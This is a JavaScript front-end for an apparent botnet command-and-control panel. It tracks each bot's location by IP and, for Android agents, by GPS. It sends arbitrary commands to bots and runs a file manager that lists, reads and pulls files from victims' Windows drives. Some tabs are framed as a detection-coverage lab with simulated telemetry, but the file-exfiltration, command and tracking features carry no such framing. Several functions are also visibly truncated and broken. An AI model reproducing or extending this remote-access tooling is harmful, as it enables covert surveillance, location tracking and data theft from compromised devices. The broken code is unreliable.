    case 'lab':         renderLab(bot); break;
    case 'coverage':    renderCoverage(bot); break;
    case 'files':       renderFiles(bot); break;
  }
}

// ── Location card (shared by Summary tab) ─────────────────────────────────────
function renderLocationCard(bot) {
  const loc = bot.lastLoc;
  if (!loc) {
    return `<div class="card" style="border-color:#1a2a1a">
      <div class="card-title" style="color:#2dbe6c">📍 Location</div>
      <p style="font-size:12px;color:var(--muted)">
        No location data yet. Waiting for first check-in from a routable IP.<br>
        <span style="font-size:11px">Windows: IP geolocation (city-level) · Android: GPS (meter-level via Live Map)</span>
      </p>
      <a href="map.html" class="btn btn-sec" style="font-size:11px;padding:5px 10px;align-self:flex-start">🌍 Open Live Map</a>
    </div>`;
  }
  const isGps   = loc.source !== 'ip';
  const mapsUrl = `https://maps.google.com/?q=${loc.lat},${loc.lon}`;
  const osmUrl  = `https://www.openstreetmap.org/?mlat=${loc.lat}&mlon=${loc.lon}&zoom=12`;
  const ago     = Math.round((Date.now()-new Date(loc.time).getTime())/1000);
  const agoStr  = ago<60?ago+'s ago': ago<3600?Math.floor(ago/60)+'m ago': Math.floor(ago/3600)+'h ago';
  return `<div class="card" style="border-color:#1a3a2a">
    <div style="display:flex;align-items:center;justify-content:space-between;gap:8px">
      <div class="card-title" style="color:#2dbe6c">📍 Location ${isGps?'<span style="font-size:9px;background:#0d2e1a;color:#2dbe6c;padding:1px 6px;border-radius:4px;font-weight:700">GPS</span>':'<span style="font-size:9px;background:#2e2a0d;color:#f4a261;padding:1px 6px;border-radius:4px;font-weight:700">IP-BASED</span>'}</div>
      <a href="map.html" style="font-size:11px;color:var(--accent)">🌍 Live Map →</a>
    </div>
    <div class="info-grid">
      ${loc.city ? `<div class="info-item"><label>City</label><p>${esc(loc.city)}, ${esc(loc.country)}</p></div>` : ''}
      ${loc.isp  ? `<div class="info-item"><label>ISP / Org</label><p>${esc(loc.isp)}</p></div>` : ''}
      <div class="info-item"><label>Coordinates</label><p>${loc.lat.toFixed(5)}, ${loc.lon.toFixed(5)}</p></div>
      ${loc.acc != null ? `<div class="info-item"><label>Accuracy</label><p>±${loc.acc}m</p></div>` : ''}
      <div class="info-item"><label>Last Fix</label><p>${agoStr}</p></div>
      <div class="info-item"><label>Source</label><p>${isGps ? 'GPS / Network' : 'IP Geolocation'}</p></div>
    </div>
    <div style="display:flex;gap:8px;flex-wrap:wrap">
      <a href="${mapsUrl}" target="_blank" class="btn btn-sec" style="font-size:11px;padding:5px 10px">📌 Google Maps</a>
      <a href="${osmUrl}"  target="_blank" class="btn btn-sec" style="font-size:11px;padding:5px 10px">🗺 OpenStreetMap</a>
      <a href="map.html" class="btn btn-sec" style="font-size:11px;padding:5px 10px">🌍 All Agents Map</a>
    </div>
    ${!isGps ? `<p style="font-size:10px;color:var(--muted)">⚠️ IP-based — city-level accuracy (~20km). Deploy Android agent for GPS-level tracking.</p>` : ''}
  </div>`;
}

function renderAttack(bot) {
  const seen = {};
  for (const e of (bot.events||[])) {

    if (!seen[e.tid]) seen[e.tid] = {tid:e.tid,tname:e.tname||'',count:0};
    seen[e.tid].count++;

  const sorted = Object.values(seen).sort((a,b)=>b.count-a.count);
  const cards  = sorted.map(t=>`
    <div class="atk-card">
      <a class="atk-id evt-atk" href="https://attack.mitre.org/techniques/${esc(t.tid.replace('.','/'))}/'" target="_blank" rel="noopener">${esc(t.tid)}</a>

  document.getElementById('main-content').innerHTML = `

      <div class="card-title">MITRE ATT&amp;CK Techniques Observed</div>
      ${sorted.length?'<div class="atk-grid">'+cards+'</div>':'<div class="empty" style="padding:16px">No mapped techniques yet &mdash; wait for telemetry events.</div>'}

}

let labActions = [];
async function renderLab(bot) {
  if (!labActions.length) { try { labActions = await api('/api/simulation-actions'); } catch(_){} }
  const tasks = bot.tasks||[];
  const actionCards = labActions.map(sa => `
    <div class="lab-action-card">
      <div style="display:flex;align-items:flex-start;justify-content:space-between;gap:8px">
        <div>
          <div class="lab-action-name">${esc(sa.name)}</div>
          <div class="lab-action-desc">${esc(sa.desc)}</div>
          <div class="lab-action-meta">
            <span class="lab-phase">${esc(sa.phase)}</span>
            <a class="evt-atk" href="https://attack.mitre.org/techniques/${esc(sa.tid.replace('.','/'))}/'" target="_blank" rel="noopener">${esc(sa.tid)}</a>
          </div>
        </div>
        <button class="btn btn-lab" onclick="createTask('${bot.id}','${esc(sa.id)}')">Queue</button>
      </div>
    </div>`).join('');
  const taskRows = tasks.length===0
    ? '<tr><td colspan="6" class="empty" style="padding:14px 8px;text-align:center">No tasks dispatched yet.</td></tr>'
    : tasks.map(t => {
        const ts   = new Date(t.timestamp).toLocaleTimeString();
        const icon = t.executed?'✓':t.approved?'▶':'○';
        const cl   = t.executed?'conf-critical':t.approved?'conf-medium':'conf-low';
        return `<tr>
          <td style="font-size:11px;color:var(--muted)">${esc(ts)}</td>
          <td>${esc(t.action)}</td>
          <td><span class="lab-phase">${esc(t.phase)}</span></td>
          <td><span class="${cl}" style="font-size:12px">${icon} ${t.executed?'Executed':t.approved?'Approved':'Pending'}</span></td>
          <td style="font-size:11px;color:var(--muted)">${esc(t.result||'—')}</td>
          <td>
            ${!t.approved?`<button class="btn btn-sec" style="padding:2px 8px;font-size:11px" onclick="approveTask('${bot.id}','${t.id}')">Approve</button>`:''}
            ${t.approved&&!t.executed?`<button class="btn btn-lab" style="padding:2px 8px;font-size:11px" onclick="executeTask('${bot.id}','${t.id}')">Execute</button>`:''}
          </td>
        </tr>`;
      }).join('');
  document.getElementById('main-content').innerHTML = `
    <div class="card">
      <div class="card-title">Lab Command Console &mdash; Bot #${bot.id}</div>
      <div class="lab-meta-row">
        <span style="color:var(--muted);font-size:12px">All actions produce simulated telemetry only. No real device access occurs.</span>
      </div>
      <div class="lab-grid">${actionCards}</div>
    </div>
    <div class="card">
      <div class="section-hdr">
        <div class="card-title">Task Queue (${tasks.length})</div>
        <button class="btn btn-sec" onclick="renderTab('${bot.id}','lab')">&#8635;</button>
      </div>
      <table class="lab-table">
        <thead><tr><th>Time</th><th>Action</th><th>Phase</th><th>Status</th><th>Result</th><th>Actions</th></tr></thead>
        <tbody>${taskRows}</tbody>
      </table>
    </div>
    <div class="card" style="font-size:12px;color:var(--muted)">
      <strong>Attack &rarr; Detection &rarr; Alert &rarr; Investigation &rarr; Response</strong><br>
      Each queued task requires operator approval before execution. Executed tasks inject a telemetry event into the detection pipeline &mdash; check the Detections and Incidents tabs to see the result.
    </div>`;
}

async function createTask(botId, actionId) {
  try { await api('/api/bot/'+botId+'/tasks',{method:'POST',body:JSON.stringify({actionId})}); await renderTab(botId,'lab'); }
  catch(e) { alert('Failed: '+e.message); }
}
async function approveTask(botId, taskId) {
  try { await api('/api/bot/'+botId+'/task/'+taskId,{method:'PATCH',body:JSON.stringify({approved:true})}); await renderTab(botId,'lab'); }
  catch(e) { alert('Failed: '+e.message); }
}
async function executeTask(botId, taskId) {
  if (!confirm('Execute this simulation task? It will inject a telemetry event into the detection pipeline.')) return;
  try { await api('/api/bot/'+botId+'/task/'+taskId,{method:'PATCH',body:JSON.stringify({execute:true})}); await renderTab(botId,'lab'); }
  catch(e) { alert('Failed: '+e.message); }
}

async function renderCoverage(bot) {
  let cov = null;
  try { cov = await api('/api/bot/'+bot.id+'/coverage'); } catch(_){}
  if (!cov) { document.getElementById('main-content').innerHTML='<div class="empty" style="padding:20px">Failed to load coverage data.</div>'; return; }

  const statusDot = s =>
    s==='covered'?'<span class="cov-dot cov-covered" title="Detected">✓</span>':
    s==='gap'?'<span class="cov-dot cov-gap" title="Event observed but no detection fired">✗</span>':
    '<span class="cov-dot cov-untested" title="Not yet tested">○</span>';

  const techRows = cov.techniques.map(t => {
    const gapRec = t.status==='gap'
      ? '<div class="cov-rec">Detection coverage gap &mdash; run coverage-tester.js to generate remediation details</div>' : '';
    return `<tr class="cov-row ${t.status}">
      <td>${statusDot(t.status)}</td>
      <td><a class="evt-atk" href="https://attack.mitre.org/techniques/${esc(t.tid.replace('.','/'))}/'" target="_blank" rel="noopener">${esc(t.tid)}</a></td>

      <td><span class="lab-phase">${esc(t.phase)}</span></td>

      ${gapRec?'<td>'+gapRec+'</td>':'<td></td>'}

  }).join('');

  let runHtml = `<div class="empty" style="padding:12px">No coverage runs recorded for this bot. Run <code>node attack-simulator/coverage-tester.js --botId ${esc(bot.id)}</code></div>`;
  if (cov.latestRun) {
    const r = cov.latestRun;
    const dt = new Date(r.timestamp).toLocaleString();
    runHtml = `<div class="cov-run-card">
      <div class="cov-run-hdr">
        <span>Run <code>${esc(r.runId)}</code> &mdash; ${esc(dt)}</span>

        <span><strong style="color:#e84242">${r.gap}</strong> gaps</span>
        <span><strong>${r.total}</strong> total</span>
      </div>
      ${(r.gaps||[]).length?'<div style="margin-top:8px;font-size:11px;color:#e84242"><strong>Gaps:</strong> '+r.gaps.map(g=>'<code>'+esc(g.tid)+'</code>').join(', ')+'</div>':''}
    </div>`;
  }

  const fillPct   = Math.min(cov.coveragePct,100);
  const fillColor = fillPct>=80?'#00C2A8':fillPct>=50?'#F4A261':'#e84242';

  document.getElementById('main-content').innerHTML = `
    <div class="card">
      <div class="card-title">ATT&amp;CK Detection Coverage &mdash; Bot #${bot.id}</div>
      <div style="display:flex;align-items:flex-end;gap:20px;flex-wrap:wrap;margin-bottom:16px">
        <div>
          <div class="risk-big" style="color:${fillColor}">${cov.coveragePct}%</div>
          <div style="font-size:12px;color:var(--muted)">${cov.covered} / ${cov.total} techniques</div>
        </div>
        <div style="flex:1;min-width:180px">
          <div style="display:flex;justify-content:space-between;font-size:10px;color:var(--muted);margin-bottom:4px"><span>0%</span><span>100%</span></div>
          <div style="height:10px;background:var(--bg3);border-radius:5px;overflow:hidden">
            <div style="height:100%;width:${fillPct}%;background:${fillColor};border-radius:5px;transition:width .4s"></div>

    <div class="card">
      <div class="section-hdr">

        <button class="btn btn-sec" style="font-size:11px" onclick="renderTab('${bot.id}','coverage')">&#8635; Refresh</button>
      </div>
      ${runHtml}
      <div style="margin-top:12px;font-size:11px;color:var(--muted)">

// ── Shared renderers ──────────────────────────────────────────────────────────

function buildEventsHtml(evts) {
  if (!evts.length) return '<div class="empty" style="padding:16px">No events.</div>';
  return evts.map(e => {
    const sev = (e.sev||'info').toLowerCase();
    const atkBadge = e.tid
      ? `<a class="evt-atk" href="https://attack.mitre.org/techniques/${esc(e.tid.replace('.','/'))}/'" target="_blank" rel="noopener">${esc(e.tid)}</a>`
      + (e.tname?'<span class="evt-cat" style="color:#7b9ff0;font-size:10px">'+esc(e.tname)+'</span>':'')
      : '';
    const extra = buildEventDataStr(e);
    return `<div class="evt sev-${sev}">
      <div class="evt-hdr">
        <span class="sev-badge ${sev}">${sev.toUpperCase()}</span>
        <span class="evt-rule">${esc(e.rule||'')}</span>
        ${atkBadge}
        <span class="evt-cat">${esc(e.cat||'')}</span>
        <span class="evt-ts">${e.ts?new Date(e.ts).toLocaleTimeString():''}</span>
      </div>
      <div class="evt-msg">${esc(e.ev||e.type||'')}</div>
      ${extra?'<div class="evt-data">'+esc(extra)+'</div>':''}
    </div>`;
  }).join('');
}

function buildEventDataStr(e) {
  const skip = new Set(['bot','ts','cat','type','sev','rule','ev','received','tid','tname']);
  return Object.entries(e).filter(([k,v])=>!skip.has(k)&&v!==undefined&&v!=='').map(([k,v])=>k+': '+v).join('  |  ');
}

function buildNetworkHtml(bot) {
  const netlog = bot.netlog||[], bs = bot.beaconStats;
  const pathCounts = {};
  for (const e of netlog) pathCounts[e.path]=(pathCounts[e.path]||0)+1;
  const endpointRows = Object.entries(pathCounts).sort((a,b)=>b[1]-a[1]).map(([p,n])=>`  │  ├── ${esc(p.padEnd(12))} ×${n}`).join('\n');
  const srcIps = [...new Set(netlog.map(e=>e.srcIp).filter(Boolean))];
  const totalReqB = netlog.reduce((s,e)=>s+(e.reqBytes||0),0);
  const totalResB = netlog.reduce((s,e)=>s+(e.resBytes||0),0);
  const flowDiagram = srcIps.length ? `Bot (${esc(srcIps[0])})\n${endpointRows}\n  │\n  └── C2 Server` : '(no connections recorded yet)';
  const beaconHtml = !bs
    ? '<div class="beacon-flag-ok">Need &ge; 4 /cmd polls for beaconing analysis.</div>'
    : `<div class="${bs.flagged?'beacon-flag-alert':'beacon-flag-ok'}">${bs.flagged?'⚠ AUTOMATED BEACONING — CV='+bs.cv:'✓ Interval looks human-irregular — CV='+bs.cv}</div>
       <div class="beacon-stat-row">
         <div class="beacon-stat"><label>Polls</label><p>${bs.pollCount}</p></div>
         <div class="beacon-stat"><label>Mean interval</label><p>${(bs.intervalMs/1000).toFixed(1)}s</p></div>
         <div class="beacon-stat"><label>Std deviation</label><p>${(bs.stdevMs/1000).toFixed(1)}s</p></div>
         <div class="beacon-stat"><label>Regularity</label><p>${esc(bs.regularity)}</p></div>
         <div class="beacon-stat"><label>↑ sent</label><p>${fmtBytes(totalReqB)}</p></div>
         <div class="beacon-stat"><label>↓ rcvd</label><p>${fmtBytes(totalResB)}</p></div>
       </div>`;
  const recentRows = [...netlog].reverse().slice(0,25).map(e=>{
    const t = new Date(e.ts).toLocaleTimeString();
    return `<div class="net-flow-row">
      <span class="net-flow-ts">${esc(t)}</span>
      <span class="net-flow-src">${esc(e.srcIp||'')}</span>
      <span class="net-flow-method ${esc(e.method||'GET')}">${esc(e.method||'')}</span>
      <span class="net-flow-path">${esc(e.path||'')}</span>
      <span class="net-flow-bytes">${fmtBytes(e.reqBytes||0)}↑ ${fmtBytes(e.resBytes||0)}↓</span>
    </div>`;
  }).join('');
  return `<div class="flow-diagram">${flowDiagram}</div><div class="beacon-bar">${beaconHtml}</div>${recentRows?'<div class="net-flow">'+recentRows+'</div>':''}`;
}

function buildIncidentsHtml(incidents, botId) {
  if (!incidents.length) return '<div class="empty" style="padding:16px">No correlated incidents yet.</div>';
  return [...incidents].reverse().map(inc => {
    const sev = (inc.severity||'medium').toLowerCase();
    const conf = inc.confidence||0;
    const confClass = conf>=80?'conf-critical':conf>=65?'conf-high':conf>=45?'conf-medium':'conf-low';
    const evidenceHtml = (inc.evidence||[]).map(e=>`<div class="inc-ev-item"><span class="sev-badge ${sev}" style="font-size:9px">${esc(e.dr_id||'')}</span><span class="inc-ev-dr">${esc(e.dr_name||'')}</span><span style="flex:1;color:var(--light)">${esc(e.ev||'')}</span>${e.tid?'<span class="evt-atk" style="cursor:default">'+esc(e.tid)+'</span>':''}</div>`).join('');
    return `<div class="inc sev-${sev}">
      <div class="inc-hdr">
        <span class="sev-badge ${sev}">${sev.toUpperCase()}</span>
        <span class="inc-name">${esc(inc.name)}</span>
        <button class="inc-status ${inc.status||'open'}" onclick="dismissIncident('${botId}','${esc(inc.id)}')">${inc.status==='closed'?'closed':'open'}</button>
        <span class="inc-ts">${new Date(inc.created).toLocaleTimeString()}</span>
      </div>
      <div class="inc-desc">${esc(inc.description||'')}</div>
      <div class="confidence-row">
        <span style="font-size:10px;color:var(--muted)">Confidence</span>
        <div class="confidence-bar"><div class="confidence-fill ${confClass}" style="width:${conf}%"></div></div>
        <span class="confidence-pct">${conf}%</span>
      </div>
      ${evidenceHtml?'<div class="inc-evidence">'+evidenceHtml+'</div>':''}
    </div>`;
  }).join('');
}

function showCmdHelp(val) {
  const div = document.getElementById('cmd-help');
  if (!div) return;
  const v = (val||'').trim().toLowerCase();
  if (!v) { div.style.display='none'; return; }
  // Try longest prefix match
  let best = null;
  for (const key of Object.keys(CMD_HELP)) {
    if (v.startsWith(key.toLowerCase()) || key.toLowerCase().startsWith(v)) {
      if (!best || key.length > best.length) best = key;
    }
  }
  if (best) {
    div.textContent = CMD_HELP[best];
    div.style.display = 'block';
  } else {
    div.style.display = 'none';
  }
}

// ── Actions ───────────────────────────────────────────────────────────────────

async function sendCmd(id) {
  const inp = document.getElementById('cmd-input');
  const cmd = (inp?inp.value:'').trim();
  if (!cmd) return;
  try { await api('/api/bot/'+id+'/cmd',{method:'POST',body:JSON.stringify({cmd})}); inp.value=''; await renderBot(id); await loadBots(); }
  catch(e) { alert('Error: '+e.message); }
}

async function sendCmdDirect(id, cmd) {
  try { await api('/api/bot/'+id+'/cmd',{method:'POST',body:JSON.stringify({cmd})}); }
  catch(e) { alert('Error: '+e.message); return; }
  setTimeout(async()=>{ await renderBot(id); await loadBots(); }, 6000);
}

async function clearResults(id) {
  if(!confirm('Clear results for bot '+id+'?')) return;
  await api('/api/bot/'+id+'/results',{method:'DELETE'});
  await renderBot(id);
}

async function clearIncidents(id) {
  if(!confirm('Clear all incidents for bot '+id+'?')) return;
  await api('/api/bot/'+id+'/incidents',{method:'DELETE'});
  await renderBot(id);
}

async function dismissIncident(botId, incId) {
  try {
    const bot  = await api('/api/bot/'+botId);
    const inc  = (bot.incidents||[]).find(i=>i.id===incId);
    const next = (!inc||inc.status==='open')?'closed':'open';
    await api('/api/bot/'+botId+'/incident/'+encodeURIComponent(incId),{method:'PATCH',body:JSON.stringify({status:next})});
    const box     = document.getElementById('incidents-box');
    const updated = await api('/api/bot/'+botId);
    if(box) box.innerHTML = buildIncidentsHtml(updated.incidents||[], botId);
    await loadBots();
  } catch(e) { console.error(e); }
}

function startRefresh() {
  clearInterval(refreshTimer);
  refreshTimer = setInterval(async()=>{
    await loadBots();
    if (currentPage==='overview') await renderOverview();
    else if (currentPage==='bot' && selId) await renderBot(selId);
  }, 5000);
}

document.getElementById('auto-refresh').addEventListener('change', function(){
  this.checked ? startRefresh() : clearInterval(refreshTimer);
});

// ── Tab: Files (Terminal File Manager) ───────────────────────────────────────

const _fmState = {};

function fmGet(botId) {
  if (!_fmState[botId]) _fmState[botId] = { path: 'C:\\', history: [], waiting: false };
  return _fmState[botId];
}

function renderFiles(bot) {
  const st = fmGet(bot.id);
  const mc = document.getElementById('main-content');
  mc.innerHTML = `
    <div class="fm-wrap">
      <div class="fm-titlebar">
        <span class="card-title" style="margin:0">File Manager — Bot #${esc(bot.id)}</span>
        <span style="font-family:monospace;font-size:11px;color:var(--muted)">ls &nbsp;cd &nbsp;pull &nbsp;cat &nbsp;dir show</span>
      </div>
      <div class="fm-output" id="fm-output"></div>
      <div class="fm-inputrow">
        <span class="fm-prompt" id="fm-prompt">${esc(st.path)}&gt;</span>
        <input class="fm-input" id="fm-input" type="text"
          placeholder="ls  /  cd Users  /  pull file.txt  /  cat readme.txt"
          onkeydown="if(event.key==='Enter')fmRun('${esc(bot.id)}')">
        <button class="btn btn-send" style="border-radius:0;padding:0 18px;font-size:12px"
          onclick="fmRun('${esc(bot.id)}')">&#9654;</button>
      </div>
    </div>`;
  const out = document.getElementById('fm-output');
  if (st.history.length) {
    out.innerHTML = st.history.map(h=>h.html).join('\n') + '\n';
  } else {
    out.innerHTML = '<span style="color:var(--muted)">Type <b>ls</b> to list the current directory, or <b>cd C:\\Users</b> to navigate, or <b>pull C:\\path\\file.txt</b> to download a file.</span>\n';
  }
  out.scrollTop = out.scrollHeight;
  document.getElementById('fm-input').focus();
}

function fmAppend(botId, html) {
  const out = document.getElementById('fm-output');
  if (!out) return;
  out.innerHTML += html + '\n';
  out.scrollTop = out.scrollHeight;
}

function fmRecord(botId, html) {
  fmGet(botId).history.push({ html });
}

async function fmRun(botId) {
  const inp = document.getElementById('fm-input');
  if (!inp) return;
  const raw = inp.value.trim();
  if (!raw) return;
  inp.value = '';
  await fmExec(botId, raw);
}

async function fmExec(botId, raw) {
  const st = fmGet(botId);
  if (st.waiting) { fmAppend(botId, '<span style="color:var(--warn)">Busy — waiting for previous command...</span>'); return; }

  let cmd, display;

  if (raw === 'ls' || raw === 'dir') {
    cmd = 'dir show ' + st.path;  display = 'ls';
  } else if (raw.startsWith('ls ')) {
    const p = fmAbs(st.path, raw.slice(3).trim());
    st.path = p;  cmd = 'dir show ' + p;  display = raw;
  } else if (raw.startsWith('cd ')) {
    const arg = raw.slice(3).trim();
    if (arg === '..') st.path = fmParent(st.path);
    else st.path = fmAbs(st.path, arg);
    cmd = 'dir show ' + st.path;  display = raw;
  } else if (raw.match(/^dir\s+show\s+/i)) {
    cmd = raw;  display = raw;
    st.path = raw.replace(/^dir\s+show\s+/i, '').trim();
  } else if (raw.startsWith('pull ')) {
    cmd = 'pull ' + fmAbs(st.path, raw.slice(5).trim());  display = raw;
  } else if (raw.startsWith('cat ') || raw.startsWith('read ')) {
    const words = raw.split(/\s+/); words.shift();
    cmd = 'dir read ' + fmAbs(st.path, words.join(' '));  display = raw;
  } else {
    cmd = raw;  display = raw;
  }

  // Update prompt span
  const promptEl = document.getElementById('fm-prompt');
  if (promptEl) promptEl.textContent = st.path + '>';

  const promptLine = `<span style="color:var(--accent)">${esc(st.path)}&gt;</span> <span style="color:var(--warn)">${esc(display)}</span>`;
  fmAppend(botId, promptLine);
  fmRecord(botId, promptLine);

  st.waiting = true;
  let bot;
  try { bot = await api('/api/bot/' + botId); }
  catch(_) { fmAppend(botId,'<span style="color:#e84242">Error: cannot reach server</span>'); st.waiting=false; return; }

  const prevRes   = bot.results.length;
  const prevFiles = bot.files.length;

  try { await api('/api/bot/'+botId+'/cmd',{method:'POST',body:JSON.stringify({cmd})}); }
  catch(e) { fmAppend(botId,`<span style="color:#e84242">Send failed: ${esc(e.message)}</span>`); st.waiting=false; return; }

  // Poll up to 30s for a result
  let done = false;
  for (let i=0; i<30 && !done; i++) {
    await new Promise(r=>setTimeout(r,1000));
    let fresh;
    try { fresh = await api('/api/bot/'+botId); } catch(_) { break; }
    if (fresh.results.length > prevRes) {
      const data = fresh.results[fresh.results.length-1].data;
      fmShowResult(botId, cmd, data, fresh, prevFiles);
      done = true;
    } else if (fresh.files.length > prevFiles) {
      const fname = fresh.files[fresh.files.length-1];
      const html = fmDownloadHtml(fname);
      fmAppend(botId, html);  fmRecord(botId, html);
      done = true;
    }
  }
  if (!done) {
    const t = '<span style="color:var(--muted)">⏱ Timed out — bot did not respond</span>';
    fmAppend(botId, t);  fmRecord(botId, t);
  }
  st.waiting = false;
}

function fmShowResult(botId, cmd, data, bot, prevFiles) {
  const entries = data.replace(/%0A/g,'\n').split('\n').map(s=>s.trim()).filter(Boolean);
  const isListing = entries.length > 0 && (entries[0].startsWith('[D]') || entries[0].startsWith('[F]'));
  let html = '';

  if (isListing) {
    const basePath = fmGet(botId).path;
    const rows = entries.map(e => {
      if (e.startsWith('[D]')) {
        const name = e.slice(3);
        const full = fmJoin(basePath, name);
        return `<span class="fm-dir" data-bot="${esc(botId)}" data-path="${esc(full)}" onclick="fmNavigate(this.dataset.bot,this.dataset.path)">📁 <span style="color:var(--accent)">${esc(name)}</span></span>`;
      } else {
        const name = e.slice(3);
        const full = fmJoin(basePath, name);
        return `<span class="fm-file">📄 <span style="color:var(--light)">${esc(name)}</span>  <button class="btn btn-sec" style="font-size:10px;padding:1px 8px;margin-left:6px" data-bot="${esc(botId)}" data-path="${esc(full)}" onclick="fmPullBtn(this)">&darr; Pull</button></span>`;
      }
    });
    html = rows.join('\n') || '<span style="color:var(--muted)">(empty)</span>';
  } else if (/^uploaded:\s*/i.test(data)) {
    const fname = data.replace(/^uploaded:\s*/i,'').trim();
    html = fmDownloadHtml(fname);
  } else if (data.startsWith('Error!')) {
    html = `<span style="color:#e84242">${esc(data)}</span>`;
  } else if (data.startsWith('Success!')) {
    html = `<span style="color:#00C2A8">${esc(data)}</span>`;
  } else {
    // plain text (dir read, system output, etc.)
    html = `<div style="background:var(--bg3);border-radius:6px;padding:8px 12px;margin:2px 0;max-height:200px;overflow-y:auto">${esc(data).replace(/%0A/g,'\n')}</div>`;
  }

  fmAppend(botId, html);
  fmRecord(botId, html);
}

function fmDownloadHtml(fname) {
  return `<span style="color:#00C2A8">✓ File received</span> — <a href="${API_BASE}/api/uploads/${encodeURIComponent(fname)}" target="_blank" style="color:var(--accent);font-weight:600">↓ Download ${esc(fname)}</a>`;
}

function fmNavigate(botId, path) {
  fmGet(botId).path = path;
  const p = document.getElementById('fm-prompt');
  if (p) p.textContent = path + '>';
  fmExec(botId, 'dir show ' + path);
}

function fmPullBtn(btn) {
  fmExec(btn.dataset.bot, 'pull ' + btn.dataset.path);
}

function fmJoin(base, name) {
  if (!name) return base;
  if (/^[A-Za-z]:\\/.test(name)) return name;
  const sep = base.endsWith('\\') ? '' : '\\';
  return base + sep + name;
}

function fmParent(path) {
  const p = path.replace(/\\+$/, '');
  const idx = p.lastIndexOf('\\');
  if (idx <= 2) return p.slice(0, idx+1) || path;
  return p.slice(0, idx);
}

function fmAbs(base, input) {
  if (!input) return base;
  if (/^[A-Za-z]:\\/.test(input)) return input;
  if (input === '..') return fmParent(base);
  return fmJoin(base, input);
}

(async () => {
  try {
    const r = await fetch(API_BASE + '/api/auth/me', { credentials: 'include' });
    const d = await r.json();
    if (!d.loggedIn) { window.location.href = 'login.html'; return; }
  } catch(_) { window.location.href = 'login.html'; return; }
  loadBots();
  renderOverview();
  startRefresh();
})();
